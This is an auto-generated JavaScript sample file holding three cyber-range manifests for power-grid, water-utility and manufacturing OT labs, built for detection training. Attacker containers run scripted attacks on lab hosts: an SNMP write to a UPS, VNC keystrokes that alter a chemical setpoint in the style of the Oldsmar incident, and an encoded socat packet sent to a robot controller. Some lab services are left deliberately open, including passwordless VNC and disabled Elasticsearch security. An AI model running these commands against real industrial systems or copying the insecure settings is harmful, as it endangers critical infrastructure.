// 自動生成ファイル — 手で編集しないこと。
// 生成元: platform/tools/gen_gui_vocab.py
// 3分野のリファレンスマニフェストを編集モデル形式で同梱したもの。
window.AMENONUBOCO_SAMPLES = [
  {
    "id": "power-grid-reference",
    "label": "電力",
    "model": {
      "apiVersion": "amenonuboco/v1alpha1",
      "instrumentation": {
        "exclude": [],
        "mirror_to": "mirror_link"
      },
      "kind": "CyberRange",
      "metadata": {
        "description": "前身プロジェクト ot-ids-verum の電力網ラボの代表要素を1枚に凝縮したリファレンススライス",
        "name": "power-grid-reference"
      },
      "structuring": {
        "elasticsearch_url": "http://elasticsearch:9200",
        "engine": "tshark",
        "protocols": [
          {
            "name": "http",
            "output_index": "ot-logs-http-*"
          },
          {
            "name": "dnp3",
            "output_index": "ot-logs-dnp3-*"
          },
          {
            "name": "opcua",
            "output_index": "ot-logs-opcua-*"
          },
          {
            "name": "snmp",
            "output_index": "ot-logs-snmp-*"
          }
        ]
      },
      "topology": {
        "assets": [
          {
            "image": "debian:bullseye-slim",
            "name": "wan_router",
            "networks": [
              {
                "ip": "10.1.10.254",
                "segment": "cc_lan"
              },
              {
                "ip": "172.18.0.254",
                "segment": "wan_link"
              },
              {
                "ip": "10.1.30.254",
                "segment": "sub_b_lan"
              },
              {
                "ip": "10.1.20.254",
                "segment": "sub_a_l2_lan"
              },
              {
                "ip": "10.1.99.254",
                "segment": "mirror_link"
              },
              {
                "ip": "10.1.40.254",
                "segment": "sub_c_lan"
              },
              {
                "ip": "10.1.50.254",
                "segment": "sub_d_l2_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": null,
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "l3-router"
          },
          {
            "image": "python:3.10-slim",
            "name": "cc_scada_master",
            "networks": [
              {
                "ip": "10.1.10.10",
                "segment": "cc_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "( python3 -m http.server 20000 & wait )",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "ot-asset"
          },
          {
            "image": "nodered/node-red:3.1.0",
            "name": "sub_b_rtu_hmi",
            "networks": [
              {
                "ip": "10.1.30.10",
                "segment": "sub_b_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "/usr/src/node-red/entrypoint.sh",
              "environment": [],
              "ports": [
                "18800:1880"
              ],
              "sysctls": null
            },
            "role": "ot-asset"
          },
          {
            "image": "python:3.10-slim",
            "name": "sub_a_ied_02",
            "networks": [
              {
                "ip": "10.1.20.11",
                "segment": "sub_a_l2_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "tail -f /dev/null",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "attacker-insider"
          },
          {
            "image": "python:3.10-slim",
            "name": "sub_c_rtu",
            "networks": [
              {
                "ip": "10.1.40.10",
                "segment": "sub_c_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "( python3 -m http.server 20000 & wait )",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "ot-asset"
          },
          {
            "image": "nodered/node-red:3.1.0",
            "name": "sub_c_hmi",
            "networks": [
              {
                "ip": "10.1.40.11",
                "segment": "sub_c_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "/usr/src/node-red/entrypoint.sh",
              "environment": [],
              "ports": [
                "18801:1880"
              ],
              "sysctls": null
            },
            "role": "ot-asset"
          },
          {
            "image": "python:3.10-slim",
            "name": "ups_attacker",
            "networks": [
              {
                "ip": "172.18.0.50",
                "segment": "wan_link"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "apt-get update -qq && apt-get install -y -qq snmp >/dev/null 2>&1 &&\n( for i in 1 2 3 4 5 6; do\n    sleep 15\n    snmpset -v2c -c public -t 5 -r 2 10.1.10.95:161 1.3.6.1.2.1.1.6.0 s 'UNAUTHORIZED_SHUTDOWN_COMMAND_INJECTED' 2>&1\n  done\n  wait\n)\n",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "attacker-external"
          },
          {
            "image": "python:3.10-slim",
            "name": "sub_d_ied_01",
            "networks": [
              {
                "ip": "10.1.50.11",
                "segment": "sub_d_l2_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "tail -f /dev/null",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "ot-asset"
          },
          {
            "image": "timberio/vector:0.46.0-alpine",
            "name": "vector",
            "networks": [
              {
                "ip": "10.1.10.35",
                "segment": "cc_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": null,
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "detection-infra"
          },
          {
            "image": "docker.elastic.co/elasticsearch/elasticsearch:8.12.0",
            "name": "elasticsearch",
            "networks": [
              {
                "ip": "10.1.10.40",
                "segment": "cc_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": null,
              "environment": [
                "discovery.type=single-node",
                "xpack.security.enabled=false",
                "ES_JAVA_OPTS=-Xms512m -Xmx512m"
              ],
              "ports": [],
              "sysctls": null
            },
            "role": "detection-infra"
          },
          {
            "image": "curlimages/curl:latest",
            "name": "es_enrich_refresher",
            "networks": [
              {
                "ip": null,
                "segment": "cc_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "while true; do curl -s -X POST http://elasticsearch:9200/_enrich/policy/detection_lookup_policy/_execute; sleep 60; done",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "detection-infra"
          },
          {
            "image": "debian:bullseye-slim",
            "name": "tap_observer",
            "networks": [
              {
                "ip": null,
                "segment": "mirror_link"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "apt-get update -qq && apt-get install -y -qq tcpdump >/dev/null 2>&1 && tcpdump -i eth0 -nn",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "observer"
          },
          {
            "image": "debian:bullseye-slim",
            "name": "log_structurer",
            "networks": [
              {
                "ip": "10.1.99.60",
                "segment": "mirror_link"
              },
              {
                "ip": "10.1.10.60",
                "segment": "cc_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": null,
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "structurer"
          },
          {
            "image": "python:3.11-slim",
            "name": "killchain_detector",
            "networks": [
              {
                "ip": "10.1.10.80",
                "segment": "cc_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": null,
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "detection-infra"
          },
          {
            "image": "python:3.11-slim",
            "name": "zone_detector",
            "networks": [
              {
                "ip": "10.1.10.81",
                "segment": "cc_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": null,
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "detection-infra"
          },
          {
            "image": "python:3.11-slim",
            "name": "eval_harness",
            "networks": [
              {
                "ip": "10.1.10.90",
                "segment": "cc_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "tail -f /dev/null",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "eval-harness"
          },
          {
            "image": "python:3.11-slim",
            "name": "caldera_server",
            "networks": [
              {
                "ip": "10.1.10.70",
                "segment": "cc_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "ls -la /app/caldera_assets/abilities /app/caldera_assets/adversaries && tail -f /dev/null",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "attack-engine"
          },
          {
            "image": "grafana/grafana:11.1.0",
            "name": "grafana_server",
            "networks": [
              {
                "ip": "10.1.10.72",
                "segment": "cc_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": null,
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "visualization-engine"
          },
          {
            "image": "python:3.10-slim",
            "name": "historian",
            "networks": [
              {
                "ip": "10.1.10.15",
                "segment": "cc_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "( python3 -m http.server 4840 & wait )",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "ot-asset"
          },
          {
            "image": "python:3.10-slim",
            "name": "cc_ups",
            "networks": [
              {
                "ip": "10.1.10.95",
                "segment": "cc_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "apt-get update -qq && apt-get install -y -qq snmpd snmp >/dev/null 2>&1 &&\nprintf 'rwcommunity public\\nsysLocation Central Control Room UPS (normal)\\n' > /etc/snmp/snmpd.conf &&\n( snmpd -f -Lf /var/log/snmpd.log &\n  sleep 3\n  tail -F /var/log/snmpd.log | while read LINE; do\n    case $LINE in\n      *'Connection from UDP'*127.0.0.1*127.0.0.1*) : ;;\n      *'Connection from UDP'*)\n        echo '[cc_ups] !!! UNAUTHORIZED SNMP ACCESS FROM NON-LOCAL SOURCE DETECTED -- SIMULATING UPS SHUTDOWN (AVAILABILITY LOSS) !!!' ;;\n    esac\n  done\n  wait\n)\n",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "ot-asset"
          }
        ],
        "routing": {
          "gateway": "wan_router"
        },
        "segments": [
          {
            "cidr": "10.1.10.0/24",
            "kind": "it-core",
            "name": "cc_lan"
          },
          {
            "cidr": "172.18.0.0/24",
            "kind": "wan-edge",
            "name": "wan_link"
          },
          {
            "cidr": "10.1.30.0/24",
            "kind": "ot-lan",
            "name": "sub_b_lan"
          },
          {
            "cidr": "10.1.20.0/24",
            "kind": "ot-l2",
            "name": "sub_a_l2_lan"
          },
          {
            "cidr": "10.1.99.0/24",
            "kind": "observation",
            "name": "mirror_link"
          },
          {
            "cidr": "10.1.40.0/24",
            "kind": "ot-lan",
            "name": "sub_c_lan"
          },
          {
            "cidr": "10.1.50.0/24",
            "kind": "ot-l2",
            "name": "sub_d_l2_lan"
          }
        ]
      }
    }
  },
  {
    "id": "water-utility-reference",
    "label": "上下水道",
    "model": {
      "apiVersion": "amenonuboco/v1alpha1",
      "instrumentation": {
        "exclude": [],
        "mirror_to": "mirror_link"
      },
      "kind": "CyberRange",
      "metadata": {
        "description": "上下水道分野のリファレンススライス。Oldsmar浄水場事件型(正規リモートアクセス経路の悪用)を主軸実演とする",
        "name": "water-utility-reference"
      },
      "structuring": {
        "elasticsearch_url": "http://elasticsearch:9200",
        "engine": "tshark",
        "protocols": [
          {
            "name": "vnc",
            "output_index": "ot-logs-vnc-*"
          },
          {
            "name": "modbus",
            "output_index": "ot-logs-modbus-*"
          }
        ]
      },
      "topology": {
        "assets": [
          {
            "image": "debian:bullseye-slim",
            "name": "wan_router",
            "networks": [
              {
                "ip": "10.2.10.254",
                "segment": "wtp_cc_lan"
              },
              {
                "ip": "172.19.0.254",
                "segment": "wan_link"
              },
              {
                "ip": "10.2.20.254",
                "segment": "pump_station_a_lan"
              },
              {
                "ip": "10.2.30.254",
                "segment": "pump_station_b_lan"
              },
              {
                "ip": "10.2.40.254",
                "segment": "remote_access_dmz"
              },
              {
                "ip": "10.2.99.254",
                "segment": "mirror_link"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": null,
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "l3-router"
          },
          {
            "image": "python:3.10-slim",
            "name": "wtp_scada_master",
            "networks": [
              {
                "ip": "10.2.10.10",
                "segment": "wtp_cc_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "( python3 -m http.server 8080 & wait )",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "ot-asset"
          },
          {
            "image": "python:3.10-slim",
            "name": "pump_a_plc",
            "networks": [
              {
                "ip": "10.2.20.10",
                "segment": "pump_station_a_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "( python3 -m http.server 502 & wait )",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "ot-asset"
          },
          {
            "image": "debian:bullseye-slim",
            "name": "pump_b_hmi",
            "networks": [
              {
                "ip": "10.2.30.10",
                "segment": "pump_station_b_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "apt-get update -qq && apt-get install -y -qq xvfb x11vnc xterm >/dev/null 2>&1 &&\n( Xvfb :1 -screen 0 800x600x16 &\n  sleep 2\n  DISPLAY=:1 xterm -fa Monospace -fs 16 -e sh -c 'echo NaOH_SETPOINT_PPM=100 normal; sleep 100000' &\n  sleep 1\n  x11vnc -display :1 -nopw -forever -shared -rfbport 5900 -bg -o /var/log/x11vnc.log &&\n  wait\n)\n",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "ot-asset"
          },
          {
            "image": "debian:bullseye-slim",
            "name": "remote_access_gateway",
            "networks": [
              {
                "ip": "10.2.40.11",
                "segment": "remote_access_dmz"
              },
              {
                "ip": "10.2.30.11",
                "segment": "pump_station_b_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "apt-get update -qq && apt-get install -y -qq socat >/dev/null 2>&1 &&\n( socat -d -d -lf /var/log/socat.log TCP-LISTEN:5900,fork,reuseaddr TCP:10.2.30.10:5900 &\n  sleep 2\n  tail -F /var/log/socat.log | while read LINE; do\n    case $LINE in\n      *'accepting connection'*)\n        echo '[remote_access_gateway] !!! REMOTE ACCESS SESSION VIA DMZ ESTABLISHED (OLDSMAR-TYPE CHANNEL) !!!' ;;\n    esac\n  done\n  wait\n)\n",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "remote-access-gateway"
          },
          {
            "image": "python:3.10-slim",
            "name": "attacker_external",
            "networks": [
              {
                "ip": "172.19.0.50",
                "segment": "wan_link"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "apt-get update -qq && apt-get install -y -qq gcc python3-dev >/dev/null 2>&1 &&\npip install --quiet vncdotool >/dev/null 2>&1 &&\n( for i in 1 2 3 4 5; do\n    sleep 15\n    vncdo -s 10.2.40.11::5900 -v -t 10 type '11100' 2>&1\n  done\n  wait\n)\n",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "attacker-external"
          },
          {
            "image": "docker.elastic.co/elasticsearch/elasticsearch:8.12.0",
            "name": "elasticsearch",
            "networks": [
              {
                "ip": "10.2.10.40",
                "segment": "wtp_cc_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": null,
              "environment": [
                "discovery.type=single-node",
                "xpack.security.enabled=false",
                "ES_JAVA_OPTS=-Xms512m -Xmx512m"
              ],
              "ports": [],
              "sysctls": null
            },
            "role": "detection-infra"
          },
          {
            "image": "debian:bullseye-slim",
            "name": "tap_observer",
            "networks": [
              {
                "ip": null,
                "segment": "mirror_link"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "apt-get update -qq && apt-get install -y -qq tcpdump >/dev/null 2>&1 && tcpdump -i eth0 -nn",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "observer"
          },
          {
            "image": "debian:bullseye-slim",
            "name": "log_structurer",
            "networks": [
              {
                "ip": "10.2.99.60",
                "segment": "mirror_link"
              },
              {
                "ip": "10.2.10.60",
                "segment": "wtp_cc_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": null,
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "structurer"
          }
        ],
        "routing": {
          "gateway": "wan_router"
        },
        "segments": [
          {
            "cidr": "10.2.10.0/24",
            "kind": "it-core",
            "name": "wtp_cc_lan"
          },
          {
            "cidr": "172.19.0.0/24",
            "kind": "wan-edge",
            "name": "wan_link"
          },
          {
            "cidr": "10.2.20.0/24",
            "kind": "ot-lan",
            "name": "pump_station_a_lan"
          },
          {
            "cidr": "10.2.30.0/24",
            "kind": "ot-lan",
            "name": "pump_station_b_lan"
          },
          {
            "cidr": "10.2.40.0/24",
            "kind": "dmz",
            "name": "remote_access_dmz"
          },
          {
            "cidr": "10.2.99.0/24",
            "kind": "observation",
            "name": "mirror_link"
          }
        ]
      }
    }
  },
  {
    "id": "manufacturing-plant-reference",
    "label": "重要製造業",
    "model": {
      "apiVersion": "amenonuboco/v1alpha1",
      "instrumentation": {
        "exclude": [],
        "mirror_to": "mirror_link"
      },
      "kind": "CyberRange",
      "metadata": {
        "description": "重要製造業分野のリファレンススライス。監視カメラ経由の横展開(物理セキュリティ網→OTフロア)を主軸実演とする",
        "name": "manufacturing-plant-reference"
      },
      "structuring": {
        "elasticsearch_url": "http://elasticsearch:9200",
        "engine": "tshark",
        "protocols": [
          {
            "name": "enip",
            "output_index": "ot-logs-enip-*"
          },
          {
            "name": "http",
            "output_index": "ot-logs-http-*"
          }
        ]
      },
      "topology": {
        "assets": [
          {
            "image": "debian:bullseye-slim",
            "name": "wan_router",
            "networks": [
              {
                "ip": "10.3.10.254",
                "segment": "corp_it_lan"
              },
              {
                "ip": "10.3.15.254",
                "segment": "mes_dmz"
              },
              {
                "ip": "10.3.20.254",
                "segment": "production_line_a_lan"
              },
              {
                "ip": "10.3.30.254",
                "segment": "production_line_b_lan"
              },
              {
                "ip": "10.3.40.254",
                "segment": "physical_security_lan"
              },
              {
                "ip": "10.3.99.254",
                "segment": "mirror_link"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": null,
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "l3-router"
          },
          {
            "image": "python:3.10-slim",
            "name": "mes_server",
            "networks": [
              {
                "ip": "10.3.15.10",
                "segment": "mes_dmz"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "( python3 -m http.server 8080 & wait )",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "ot-asset"
          },
          {
            "image": "python:3.10-slim",
            "name": "line_a_plc",
            "networks": [
              {
                "ip": "10.3.20.10",
                "segment": "production_line_a_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "( python3 -m http.server 44818 & wait )",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "ot-asset"
          },
          {
            "image": "debian:bullseye-slim",
            "name": "line_b_robot_controller",
            "networks": [
              {
                "ip": "10.3.30.10",
                "segment": "production_line_b_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "apt-get update -qq && apt-get install -y -qq socat >/dev/null 2>&1 &&\n( socat -d -d -lf /var/log/socat.log TCP-LISTEN:44818,fork,reuseaddr STDOUT &\n  sleep 2\n  tail -F /var/log/socat.log | while read LINE; do\n    case $LINE in\n      *'accepting connection'*)\n        echo '[line_b_robot_controller] !!! UNEXPECTED CONNECTION FROM PHYSICAL SECURITY SEGMENT DETECTED (LATERAL MOVEMENT) !!!' ;;\n    esac\n  done\n  wait\n)\n",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "ot-asset"
          },
          {
            "image": "python:3.10-slim",
            "name": "nvr_server",
            "networks": [
              {
                "ip": "10.3.40.10",
                "segment": "physical_security_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "( python3 -m http.server 80 & wait )",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "security-asset"
          },
          {
            "image": "python:3.10-slim",
            "name": "access_control_panel",
            "networks": [
              {
                "ip": "10.3.40.11",
                "segment": "physical_security_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "( python3 -m http.server 80 & wait )",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "security-asset"
          },
          {
            "image": "python:3.10-slim",
            "name": "attacker_internal",
            "networks": [
              {
                "ip": "10.3.40.50",
                "segment": "physical_security_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "apt-get update -qq && apt-get install -y -qq socat >/dev/null 2>&1 &&\n( for i in 1 2 3 4 5; do\n    sleep 15\n    echo BAAAAAAAAAAAAAAAUElWT1QhISEAAAAA | base64 -d | socat - TCP:10.3.30.10:44818,connect-timeout=5\n  done\n  wait\n)\n",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "attacker-internal"
          },
          {
            "image": "docker.elastic.co/elasticsearch/elasticsearch:8.12.0",
            "name": "elasticsearch",
            "networks": [
              {
                "ip": "10.3.10.40",
                "segment": "corp_it_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": null,
              "environment": [
                "discovery.type=single-node",
                "xpack.security.enabled=false",
                "ES_JAVA_OPTS=-Xms512m -Xmx512m"
              ],
              "ports": [],
              "sysctls": null
            },
            "role": "detection-infra"
          },
          {
            "image": "debian:bullseye-slim",
            "name": "tap_observer",
            "networks": [
              {
                "ip": null,
                "segment": "mirror_link"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": "apt-get update -qq && apt-get install -y -qq tcpdump >/dev/null 2>&1 && tcpdump -i eth0 -nn",
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "observer"
          },
          {
            "image": "debian:bullseye-slim",
            "name": "log_structurer",
            "networks": [
              {
                "ip": "10.3.99.60",
                "segment": "mirror_link"
              },
              {
                "ip": "10.3.10.60",
                "segment": "corp_it_lan"
              }
            ],
            "overrides": {
              "cap_add": null,
              "command": null,
              "environment": [],
              "ports": [],
              "sysctls": null
            },
            "role": "structurer"
          }
        ],
        "routing": {
          "gateway": "wan_router"
        },
        "segments": [
          {
            "cidr": "10.3.10.0/24",
            "kind": "it-core",
            "name": "corp_it_lan"
          },
          {
            "cidr": "10.3.15.0/24",
            "kind": "dmz",
            "name": "mes_dmz"
          },
          {
            "cidr": "10.3.20.0/24",
            "kind": "ot-lan",
            "name": "production_line_a_lan"
          },
          {
            "cidr": "10.3.30.0/24",
            "kind": "ot-lan",
            "name": "production_line_b_lan"
          },
          {
            "cidr": "10.3.40.0/24",
            "kind": "security-lan",
            "name": "physical_security_lan"
          },
          {
            "cidr": "10.3.99.0/24",
            "kind": "observation",
            "name": "mirror_link"
          }
        ]
      }
    }
  }
];
